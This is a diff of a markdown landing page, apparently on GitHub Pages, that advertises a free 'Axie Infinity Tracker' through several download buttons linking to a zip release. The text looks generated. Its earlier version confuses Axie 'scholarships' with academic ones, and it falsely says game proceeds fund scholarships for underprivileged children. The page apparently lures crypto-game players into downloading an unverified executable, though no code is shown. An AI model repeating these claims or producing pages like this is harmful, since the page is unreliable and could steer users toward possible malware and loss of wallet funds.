@@ -1,12 +1,11 @@
 <link rel="shortcut icon" type="image/png" 
       href="{{ "https://github.com/axie-tracker/axie-tracker.github.io/blob/main/axie-infinity-icon.png?raw=true"  | absolute_url }}">
 
-Are you looking for a new way to keep track of your academic progress and manage your scholarship funds? If so, you should consider investing in an Axie Infinity Tracker.
+Are you looking for a new way to keep track of your Axie progress and manage your scholarship? If so, you should consider investing in an Axie Infinity Tracker.
 
 [![Alt text](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/download-button-plain.png?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
 
-
-This tracker is perfect for anyone who is looking for an easy way to manage their academic and scholarship data. Plus, it's super affordable, making it a great option for students of all ages.
+This tracker is perfect for anyone who is looking for an easy way to manage their Axie scholarship and more. Plus, it's completely free to download!
 
 [![Axie Scholarship Management Tracker](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/axie-scholarship-tracker.png?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
 
@@ -16,15 +15,12 @@ This tracker is perfect for anyone who is looking for an easy way to manage thei
 
 Axie Infinity is a digital pet game that allows you to collect, breed, and battle your own adorable creatures called Axies. In the game, you can explore a stunning world filled with magical creatures, discover new areas, and take on challenges to earn rewards. You can also compete against other players in exciting PvP battles.
 
-
 Axie Infinity is more than just a fun and cute game – it also has a big heart. The team behind Axie Infinity is committed to using blockchain technology to make a positive impact on the world. A portion of all proceeds from the sale of in-game items goes towards funding scholarships for underprivileged children in developing countries.
-
 
 So not only is Axie Infinity a ton of fun, but it’s also doing good in the world. What’s not to love?
 
 
 ## What Is The Axie Infinity Tracker?
-
 
 The Axie Infinity Tracker is a tool that allows users to track their progress in the game, as well as manage their scholarship and other activities. The tracker is designed to help users stay on top of their game by providing them with reminders and notifications about upcoming deadlines, tasks, and events. It also allows users to share their progress with friends and family members.
 
